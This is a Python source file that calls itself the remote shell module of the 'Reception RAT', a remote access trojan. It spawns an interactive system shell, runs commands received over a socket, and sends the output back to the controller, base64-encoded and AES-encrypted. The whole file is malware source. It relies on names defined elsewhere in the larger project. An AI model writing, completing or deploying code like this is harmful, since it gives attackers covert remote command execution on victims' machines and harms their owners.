'''
REMOTE SHELL
VERSION : 1.0.0
AUTHOR : ISSAC

THIS IS THE REMOTE SHELL SCRIPT OF THE RECEPTION RAT

'''

import subprocess
import base64
import threading
import os

class Shell:
    '''
    INITIALIZATION
    '''
    def __init__(self, sock) -> None:
        self.sock = sock
        self.start = False
        self.init_cd = False
        self.command = shell[1]
        self.proc = None
        self.ShellEncoding = 'utf-8' # TERMINAL ENCODING

    '''
    SEND OUTPUT (STDOUT/STDERR)
    '''
    def send_output(self, out:bytes):
        out = out.decode(self.ShellEncoding).encode('utf-8') # CONVERT OUTPUT FROM GIVEN ENCODING TO UTF-8
        line_b64 = base64.b64encode(out).decode('utf-8')

        payload = f'{line_b64}|'
        payload = f'Shell|{payload}'

        buffer = base64.b64encode(payload.encode('utf-8')).decode()
        sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))

    def s2p(self, p):
        self.proc.stdin.write('\n')
        self.proc.stdin.flush()
        
        while True:
            try:
                if self.command != None:
                    if unix_like():
                        self.send_output(f'$ {self.command}\n'.encode(self.ShellEncoding))

                    self.proc.stdin.write(self.command + '\n')
                    self.proc.stdin.flush()

                    #self.send_output(self.command.encode(self.ShellEncoding))

                    self.command = None
            except:
                break

    def p2s(self, p:subprocess.Popen):
        while True:
            try:
                line = p.stdout.readline()
                self.send_output(line.encode(self.ShellEncoding))
            except:
                break
    
    def err(self, p:subprocess.Popen):
        while True:
            try:
                self.send_output(p.stderr.readline().encode(self.ShellEncoding))
            except:
                break

    def run(self):
        if self.start:
            self.command = shell[1]
        else:
            _exec = shell[1]
            if unix_like():
                _exec = '/bin/sh -i'
            self.proc = subprocess.Popen(_exec, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, text=True)
            self.start = True
            self.command = None
            
            threads = [
                self.s2p,
                self.p2s,
                self.err,
            ]
            
            for t in threads:
                threading.Thread(target=t, args=[self.proc], daemon=True).start()